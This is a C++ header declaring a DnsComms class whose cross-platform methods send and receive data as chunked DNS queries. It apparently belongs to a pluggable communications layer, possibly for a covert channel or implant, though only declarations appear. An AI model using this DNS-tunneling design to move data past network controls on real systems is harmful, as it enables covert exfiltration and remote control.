#ifndef DNSCOMMS_H
#define DNSCOMMS_H

#include "communication/BaseComms.h"
#include "core/Platform.h"
#include <string>

class Configuration;

class DnsComms : public BaseComms { 
public:
    explicit DnsComms(Configuration* config);
    ~DnsComms() override;
    
    bool Initialize() override;
    bool SendData(const std::vector<uint8_t>& data) override;
    void Cleanup() override;
    [[nodiscard]] bool TestConnection() const override;
    std::vector<uint8_t> ReceiveData() override;
    
private:
    Configuration* m_config;
    std::string m_dnsServer;
    
    // Platform-specific DNS query methods
    [[nodiscard]] static bool SendDataWindows(const std::vector<std::string>& chunks);
    [[nodiscard]] bool SendDataLinux(const std::vector<std::string>& chunks) const;
    [[nodiscard]] static bool TestConnectionWindows();
    [[nodiscard]] static bool TestConnectionLinux();
};

#endif